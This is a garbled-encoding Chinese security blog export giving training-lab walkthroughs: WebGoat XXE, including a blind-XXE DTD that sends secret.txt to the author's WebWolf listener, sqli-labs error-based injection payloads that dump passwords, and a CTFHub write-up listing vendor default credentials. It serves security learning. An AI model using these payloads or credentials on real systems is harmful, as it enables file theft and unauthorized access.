<h3 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h3><h4 id="å‰è¨€ï¼š-1"><a href="#å‰è¨€ï¼š-1" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">åœ¨ç°ä»£ REST æ¡†æ¶ä¸­ï¼ŒæœåŠ¡å™¨å¯èƒ½èƒ½å¤Ÿæ¥å—æ‚¨ä½œä¸ºå¼€å‘äººå‘˜æ²¡æœ‰è€ƒè™‘è¿‡çš„æ•°æ®æ ¼å¼ã€‚å› æ­¤ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ JSON ç«¯ç‚¹å®¹æ˜“å—åˆ° XXE æ”»å‡»ã€‚</span><br><span class="line"></span><br><span class="line">å†æ¬¡è¿›è¡Œç›¸åŒçš„ç»ƒä¹ ï¼Œä½†å°è¯•æ‰§è¡Œä¸æˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªä½œä¸šä¸­æ‰€åšçš„ç›¸åŒçš„ <span class="keyword">XML</span> <span class="title">æ³¨å…¥ã€‚</span></span><br></pre></td></tr></table></figure>





<p>è¿™ä¸ªæ˜æ˜¾å‘ç°åº•ä¸‹çš„è¯„è®ºä¼ é€’æ ¼å¼ä¸å†æ˜¯<code>xml</code></p>
<p>è€Œæ˜¯åœ¨ç”¨<code>json</code>è¿›è¡Œä¼ é€’</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">jsonï¼š</span><br><span class="line">æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚äººç±»å¾ˆå®¹æ˜“é˜…è¯»å’Œå†™ä½œã€‚æœºå™¨å¾ˆå®¹æ˜“è§£æå’Œç”Ÿæˆã€‚å®ƒåŸºäº JavaScript ç¼–ç¨‹è¯­è¨€æ ‡å‡†</span><br><span class="line"></span><br><span class="line">åœ¨ <span class="built_in">JSON</span> ä¸­ï¼Œå®ƒä»¬é‡‡ç”¨ä»¥ä¸‹å½¢å¼ï¼š</span><br><span class="line"></span><br><span class="line">å¯¹è±¡æ˜¯ä¸€ç»„æ— åºçš„åç§°<span class="regexp">/å€¼å¯¹ã€‚ä¸€ä¸ªå¯¹è±¡ä»¥&#123;ï¼ˆå·¦å¤§æ‹¬å·ï¼‰å¼€å§‹ï¼Œä»¥&#125;ï¼ˆå³å¤§æ‹¬å·ï¼‰ç»“æŸã€‚æ¯ä¸ªåç§°åè·Ÿï¼šå†’å·ï¼Œåç§°/</span>å€¼å¯¹ç”±é€—å·åˆ†éš”ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="/post/underline-learning/image-20221015195333753.png" alt="image-20221015195333753"></p>
<p>è¿™é‡Œæˆ‘ä»¬çœ‹</p>
<p><img src="/post/underline-learning/image-20221015200313439.png" alt="image-20221015200313439"></p>
<p>å°±çŸ¥é“æ˜¯ä¿®æ”¹ <code>Content-Type</code></p>
<p><img src="/post/underline-learning/image-20221015200353909.png" alt="image-20221015200353909"></p>
<p>æˆ‘ä»¬ç›´æ¥æŠŠ</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">æ”¹æˆ</span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">xml</span></span><br></pre></td></tr></table></figure>

<p>é‚£å°±å¯ä»¥ä»¥ <code>xml</code> å½¢å¼ä¸Šä¼ è¯„è®ºï¼Œä»è€Œå®ç° <code>xxe</code> æ³¨å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">root</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/&quot;</span>&gt;</span>     </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;root;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/underline-learning/image-20221015200758568.png" alt="image-20221015200758568"></p>
<p>æˆåŠŸ</p>
<h3 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h3><h4 id="å‰è¨€ï¼š-2"><a href="#å‰è¨€ï¼š-2" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">åœ¨æœ¬ä½œä¸šä¸­å°è¯•åˆ¶ä½œä¸€ä¸ª DTDï¼Œå®ƒå°†æ–‡ä»¶ secret<span class="selector-class">.txt</span> çš„å†…å®¹ä» WebGoat æœåŠ¡å™¨ä¸Šä¼ åˆ°æˆ‘ä»¬çš„ WebWolf æœåŠ¡å™¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ WebWolf ä¸ºæ‚¨çš„ DTD æä¾›æœåŠ¡ã€‚secret<span class="selector-class">.txt</span> ä½äºæ­¤ä½ç½®çš„ WebGoat æœåŠ¡å™¨ä¸Šï¼Œå› æ­¤æ‚¨æ— éœ€æ‰«ææ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼š</span><br><span class="line"></span><br><span class="line">ä½ 	                 åœ°ç‚¹</span><br><span class="line">Windows <span class="number">10</span>            C:\Users\Ttoc/<span class="selector-class">.webgoat-8</span>.<span class="number">2.2</span><span class="comment">//XXE/secret.txt</span></span><br><span class="line"></span><br><span class="line">å°è¯•ä½¿ç”¨ WebWolf ç™»å½•é¡µé¢ä¸Šä¼ æ­¤æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šï¼ˆ æ³¨æ„ï¼šæ­¤ç«¯ç‚¹ç”±æ‚¨å®Œå…¨æ§åˆ¶ï¼‰ä¸€æ—¦æ‚¨è·å¾—æ–‡ä»¶çš„å†…å®¹ï¼Œå°†å…¶ä½œä¸ºæ–°è¯„è®ºå‘å¸ƒåœ¨é¡µé¢ä¸Šï¼Œæ‚¨å°†è§£å†³è¯¾ç¨‹ã€‚http:<span class="comment">//127.0.0.1:9090/landing</span></span><br></pre></td></tr></table></figure>





<p>ç›²æ³¨å°±æ˜¯æ²¡æœ‰å›æ˜¾å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬ç›®æ ‡æœåŠ¡å™¨çš„æ•æ„Ÿæ–‡ä»¶å†…å®¹è·å–åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">ç®€è€Œè¨€ä¹‹ï¼Œ</span><br><span class="line"></span><br><span class="line">webgoatå¼€å¯äº†ç«™ç‚¹ï¼Œè¿™ä¸ªç«™ç‚¹æœ‰XXEï¼ŒwebgoatæœåŠ¡å™¨ä¸Šæœ‰ä¸ªå¯†ç æ–‡ä»¶ï¼Œé€šè¿‡XXEæŠŠè¿™ä¸ªå¯†ç æ–‡ä»¶è¯»å–ï¼Œå¹¶ä¸”å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„æ¶æ„ç«™ç‚¹webwolfï¼Œwebwolfæ¥å—åˆ°è¿™ä¸ªè¯·æ±‚å°±é¡ºç†æˆç« è·å–äº†å¯†ç æ–‡ä»¶é‡Œé¢çš„å¯†ç </span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œä¸»è¦åˆ©ç”¨<code>xml</code>é€šè¿‡<code>DTD</code>å®ç°æ–‡ä»¶åŒ…å«ï¼Œ</p>
<p>å…ˆæŠŠæˆ‘ä»¬è‡ªå·±å†™çš„<code>DTD</code>æ–‡ä»¶åŒ…å«åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨<code>webwolf</code>ï¼Œç„¶ååœ¨<code>webgoat</code>ä¸Šé€šè¿‡<code>xxe</code>è¿›è¡Œè¿œç¨‹åŒ…å«æˆ‘ä»¬ç«™ç‚¹çš„è¿™ä¸ª<code>DTD</code>æ–‡ä»¶ï¼Œç„¶å<code>webgoat</code>åœ¨è§£ææˆ‘ä»¬çš„<code>DTD</code>æ–‡ä»¶çš„æ—¶å€™å°±ä¼šæŠŠ<code>secret.txt</code>æ–‡ä»¶å†…å®¹èµ‹å€¼åˆ°æ–‡ä»¶å¹¶ä½œä¸ºå‚æ•°å‘é€åˆ°æˆ‘ä»¬çš„<code>webwolf</code>æœåŠ¡å™¨</p>
<hr>
<p>æˆ‘ä»¬å…ˆå‘é€è¯„è®ºçœ‹çœ‹</p>
<p>è¿™é‡Œå‘é€çš„æ˜¯ç©ºå†…å®¹ï¼Œå›æ˜¾çš„å†…å®¹çœ‹æ¥æ˜¯æç¤ºï¼Œ</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">éœ€è¦æˆ‘ä»¬å…ˆåœ¨`webwolf`ä¸Šä¸Šä¼ æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p><img src="/post/underline-learning/image-20221017201611949.png" alt="image-20221017201611949"></p>
<p>æˆ‘ä»¬å…ˆæŠ“åŒ…çœ‹çœ‹webgoatçš„è¯„è®ºçš„è§£ææ ¼å¼æ˜¯æ€ä¹ˆæ ·çš„</p>
<p><img src="/post/underline-learning/image-20221017201938082.png" alt="image-20221017201938082"></p>
<p>çœ‹æ¥æ˜¯æ­£å¸¸çš„<code>xml</code>è§£æ</p>
<p>æˆ‘ä»¬å…ˆåœ¨<code>webwolf</code>ä¸Šä¸Šä¼ æˆ‘ä»¬çš„<code>evil.dtd</code>æ–‡ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//å£°æ˜å˜é‡ write å¹¶åµŒå¥—èµ‹å€¼<span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://localhost:9090/landing?text=%file;&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ä¸ºä»€ä¹ˆè¿˜è¦ç”¨ä¸€ä¸ªå‚æ•°å®ä½“åµŒå¥—å‘¢ï¼Ÿ</span><br><span class="line">å› ä¸ºå¦‚æœæˆ‘ä»¬ç”¨ä¸€ä¸ªwriteå‚æ•°å®ä½“å°†sendå¤–éƒ¨å®ä½“çš„å®šä¹‰å†™è¿›è¯·æ±‚ä¸­ï¼Œåœ¨%write;æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œ%fileä¹Ÿä¼šè¢«æ›¿æ¢æˆç›¸åº”çš„æ–‡æœ¬ã€‚å› æ­¤æœ€åï¼Œ?textåé¢çš„å€¼å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å†…å®¹</span><br></pre></td></tr></table></figure>

<p><img src="/post/underline-learning/image-20221017205520515.png" alt="image-20221017205520515"></p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œçš„å˜é‡èµ‹å€¼å’Œå‰é¢çš„ä¸åŒ</span><br><span class="line">å®ƒæ˜¯</span><br><span class="line"><span class="comment">%ï¼ˆç©ºæ ¼ï¼‰å˜é‡å</span></span><br><span class="line">è¿™ç§å‘½åçš„æ–¹å¼çš„å˜é‡åªèƒ½åœ¨DTDé‡Œç”¨ï¼Œè€Œåœ¨xmlé‡Œç”¨ä¸äº†</span><br></pre></td></tr></table></figure>

<p><img src="/post/underline-learning/image-20221017211907400.png" alt="image-20221017211907400"></p>
<p>ä¸Šä¼ æˆåŠŸåæˆ‘ä»¬åœ¨<code>incoming requests</code>é‡Œçœ‹åˆ°ä¸Šä¼ è·¯å¾„ï¼Œè¿™æ ·åœ¨<code>webgoat</code>å°±è°ƒç”¨è®¿é—®åŒ…å«å°±è¡Œäº†</p>
<p><img src="/post/underline-learning/image-20221017211827208.png" alt="image-20221017211827208"></p>
<p>ç„¶åæˆ‘ä»¬å†åœ¨<code>webgoat</code>æŠ“åŒ…æ•°æ®é‡Œæ„é€ æˆ‘ä»¬çš„<code>payload</code></p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Users/Ttoc/.webgoat-8.2.2/XXE/secret.txt&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//è¿™ä¸ªè·¯å¾„æ˜¯æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå› ä¸ºåœ¨æ‰§è¡Œjaræ–‡ä»¶çš„æ—¶å€™ï¼Œè‡ªåŠ¨ç”Ÿæˆäº†è¿™ä¸ªæ–‡ä»¶</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">getdtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/ttocplus/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//æ³¨æ„è¿™é‡Œæ˜¯ä¸Šä¼ è·¯å¾„ï¼Œè¦å†™è‡ªå·±çš„</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%getdtd; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%write;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//åœ¨%getdtd;åé¢è°ƒç”¨%write;</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="symbol">&amp;send;</span> </span></span><br><span class="line"><span class="language-xml">     //å†è°ƒç”¨%writeé‡Œçš„&amp;sendå˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯å†åµŒå¥—çš„DTDè¯­å¥ä¸­å£°æ˜ï¼Œæ‰€ä»¥éœ€è¦åœ¨xmlé‡Œè°ƒç”¨</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure>

<p>è™½ç„¶æç¤ºæ˜¯æŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬åˆ°æˆ‘ä»¬çš„<code>webwolf</code>ä¸ŠæŸ¥çœ‹</p>
<p><img src="/post/underline-learning/image-20221018140310837.png" alt="image-20221018140310837"></p>
<hr>
<p>è¿™ä¸ªæ˜¯<code>secret.txt</code>çš„å€¼ï¼Œæˆ‘ä»¬çœ‹çœ‹<code>webwolf</code>ä¸Šæœ‰æ²¡æœ‰è·å¾—è¯¥æ•°æ®</p>
<p><img src="/post/underline-learning/image-20221017234256596.png" alt="image-20221017234256596"></p>
<hr>
<p>æˆåŠŸè·å–</p>
<p><img src="/post/underline-learning/image-20221018141126472.png" alt="image-20221018141126472"></p>
<p>æˆåŠŸ</p>
<h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>è¿™é‡Œä¸å…¨å†™ï¼Œè¯¦ç»†å»ºè®®æ‰¾ä¸€ä¸‹sql-labså¤©ä¹¦ï¼Œè®¤çœŸå­¦ä¹ ä¸€ä¸‹</u></em></p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>å…¶å®æˆ‘ä»¬å¯ä»¥å…ˆåœ¨æºä»£ç ä¸­çœ‹åˆ°ä¸€ä¸ªå‡½æ•°ã€‚<code>check_input()</code>å‡½æ•°ã€‚ å°±ä¼šäº†è§£ä¸ºä»€ä¹ˆä¸åœ¨<code>username</code>å¤„è¿›è¡Œæ³¨å…¥</p>
<p><img src="/post/underline-learning/image-20220729232132515.png" alt="image-20220729232132515"></p>
<p><img src="/post/underline-learning/image-20220729232104117.png" alt="image-20220729232104117"></p>
<p>è¿™é‡ŒæŠŠè¿™å‡ ä¸ªå‡½æ•°è§£é‡Šä¸€ä¸‹ï¼Œå°±æ¸…æ¥šäº†</p>
<p><strong>â˜…addslashes()</strong></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">addslashes<span class="comment">()</span> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š </span><br><span class="line"></span><br><span class="line">â€‹å•å¼•å·ï¼ˆ<span class="string">&#x27;ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹åŒå¼•å·ï¼ˆ&quot;ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹åæ–œæ ï¼ˆ\ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹NULL </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æç¤ºï¼šè¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ³¨é‡Šï¼šé»˜è®¤åœ°ï¼ŒPHP å¯¹æ‰€æœ‰çš„ GETã€POST å’Œ COOKIE æ•°æ®è‡ªåŠ¨è¿è¡Œ addslashes()ã€‚æ‰€ä»¥æ‚¨ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨ addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä»¥ä½¿ç”¨å‡½æ•° get_magic_quotes_gpc() è¿›è¡Œæ£€æµ‹ã€‚ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">è¯­æ³•ï¼šaddslashes(<span class="built_in">string</span>) </span><br><span class="line"></span><br><span class="line">å‚æ•°             æè¿°</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>          å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">è¿”å›å€¼ï¼š         è¿”å›å·²è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">PHP ç‰ˆæœ¬ï¼š       <span class="number">4</span>+ </span><br></pre></td></tr></table></figure>

<p><strong>â˜…stripslashes()</strong> </p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åˆ é™¤ç”± <span class="built_in">addslashes</span>() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚ </span><br></pre></td></tr></table></figure>

<p><strong>â˜…mysql_real_escape_string()</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å‡½æ•°è½¬ä¹‰ <span class="keyword">SQL</span> è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ </span><br></pre></td></tr></table></figure>

<p>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š </p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\x00</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\n</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\r</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\x1a </span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">è¯­æ³•ï¼šmysql_real_escape_string(<span class="built_in">string</span>,connection) </span><br><span class="line"></span><br><span class="line">å‚æ•°                              æè¿° </span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>                            å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">connection å¯é€‰ã€‚    è§„å®š MySQL è¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ³¨å…¥å¤„åº”è¯¥åœ¨<code>passwd</code>ä¸­</p>
<p>å¼€å§‹å…ˆå°è¯•æ³¨å…¥ï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œ</p>
<p>æ‰€ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>
<p>æŠ¥å‡º<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
<p><img src="/post/underline-learning/image-20220905094419111.png" alt="image-20220905094419111"></p>
<p><u>å¤§è‡´æ„æ€æ˜¯ï¼Œåœ¨åŒä¸€è¯­å¥ä¸­ï¼Œä¸èƒ½å…ˆselectå‡ºåŒä¸€è¡¨ä¸­çš„æŸäº›å€¼ï¼Œå†updateè¿™ä¸ªè¡¨</u></p>
<p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦åŠ ä¸€ä¸ªä¸­é—´è¡¨ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªé”™è¯¯</p>
<p>æ¯”å¦‚</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>
<p>è¿™é‡Œå°±æ˜¯æŠŠ<code>(select password from users)</code>çš„æŸ¥è¯¢åçš„æ•°æ®å­˜å…¥ç”Ÿæˆçš„æ–°è¡¨aï¼Œç„¶åå°±ç›¸å½“äº<code>(select password from a)</code></p>
<p><img src="/post/underline-learning/image-20220905094517322.png" alt="image-20220905094517322"></p>
<p>å‘ç°ä¸èƒ½è¶…è¿‡ä¸€è¡Œ</p>
<p>äºæ˜¯ç”¨</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>
<p>æˆåŠŸ</p>
<p><img src="/post/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></p>
<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">æ¨èæ–‡ç« é“¾æ¥</a></p>
<p><em><u>ä¸è¦åªçŸ¥é“payloadï¼Œè¦ä»”ç»†åˆ†æç†è§£æºç ï¼Œæ‰¾å‡ºå‡ºç°æ¼æ´çš„åŸå› ç‚¹</u></em></p>
<p><u><code>å»ºè®®çœ‹æ¨èæ–‡ç« ï¼Œä¸‹é¢ä»£ç å®¡è®¡å’Œé¢˜ç›®åˆ†æä»…æ˜¯æˆ‘ä¸ªäººèƒ½åŠ›ç»“æœï¼Œåªèƒ½å°½å¯èƒ½è¯´åˆ°ç‚¹å¤„</code></u></p>
<p><u><code>è€Œä¸”éƒ¨åˆ†ä¹Ÿæ˜¯å€Ÿé‰´æ¨èæ–‡ç« å†…å®¹</code></u></p>
<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>å»ºè®®çœ‹æ–‡ç« ï¼Œæœ€åå‡ å…³äºŒæ¬¡æ¸²æŸ“å’Œæ¡ä»¶ç«äº‰å»ºè®®ä»”ç»†å­¦ä¹ ä¸€ä¸‹</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFHub-wp</title>
    <url>//post/wp-CTFHub/</url>
    <content><![CDATA[<p><code>åšåšç¬”è®°</code></p>
<span id="more"></span>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-å¯†ç å£ä»¤"><a href="#1-å¯†ç å£ä»¤" class="headerlink" title="1.å¯†ç å£ä»¤"></a>1.å¯†ç å£ä»¤</h2><h3 id="1ï¼‰å¼±å£ä»¤"><a href="#1ï¼‰å¼±å£ä»¤" class="headerlink" title="1ï¼‰å¼±å£ä»¤"></a>1ï¼‰å¼±å£ä»¤</h3><p>ä¸€èˆ¬æ€ç»´ï¼Œ</p>
<p>ç”¨æˆ·åï¼šadminï¼Œroot</p>
<p>å¯†ç ï¼špasswordï¼Œadmin123ï¼Œ123456</p>
<p>å¯ä»¥ç”¨<strong>top100å­—å…¸</strong>ï¼ˆå¯ä»¥ç½‘ä¸Šæ‰¾ä¸€ä¸‹ï¼‰è·‘ä¸€ä¸‹ï¼Œä½†æœ‰çš„å¯èƒ½éœ€è¦<strong>æšä¸¾æ³•</strong></p>
<p>æ¯”å¦‚<strong>admin888</strong>æˆ–è€…<strong>admin255</strong>è¿™æ ·çš„ç±»ä¼¼çš„ï¼Œå°±éœ€è¦åœ¨åé¢ç”¨æšä¸¾æ³•æ‰¾å‡ºï¼Œå­—å…¸å¹¶æ²¡åŒ…å«è¿™ç§ç±»ä¼¼æƒ…å†µ</p>
<h3 id="2ï¼‰é»˜è®¤å£ä»¤"><a href="#2ï¼‰é»˜è®¤å£ä»¤" class="headerlink" title="2ï¼‰é»˜è®¤å£ä»¤"></a>2ï¼‰é»˜è®¤å£ä»¤</h3><p>å°±æ˜¯ç³»ç»Ÿé»˜è®¤çš„å£ä»¤ï¼Œåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯é‡åˆ°å¼±å£ä»¤å¾—åˆ°å…¥å£ä»è€Œæ”»é™·æ•´ä¸ªç³»ç»Ÿï¼Œç”±äºå¾ˆå¤šç³»ç»Ÿç®¡ç†å‘˜ç¼ºå°‘å®‰å…¨æ„è¯†ï¼Œå£ä»¤å¾€å¾€æ˜¯ç³»ç»Ÿé»˜è®¤è®¾ç½®çš„å£ä»¤</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">å¸¸è§ç½‘ç»œå®‰å…¨è®¾å¤‡å¼±å£ä»¤(é»˜è®¤å£ä»¤)</span><br><span class="line">è®¾å¤‡    é»˜è®¤è´¦å·    é»˜è®¤å¯†ç </span><br><span class="line">æ·±ä¿¡æœäº§å“    sangfor    sangfor sangfor@<span class="number">2018</span> sangfor@<span class="number">2019</span></span><br><span class="line">æ·±ä¿¡æœç§‘æŠ€â€‚AD        dlanrecover</span><br><span class="line">æ·±ä¿¡æœè´Ÿè½½å‡è¡¡ AD <span class="number">3.6</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœWAC ( WNS V2<span class="number">.6</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœVPN    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">æ·±ä¿¡æœipsec-VPN (SSL <span class="number">5.5</span>)    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">æ·±ä¿¡æœAC6<span class="number">.0</span>    <span class="keyword">admin</span>    <span 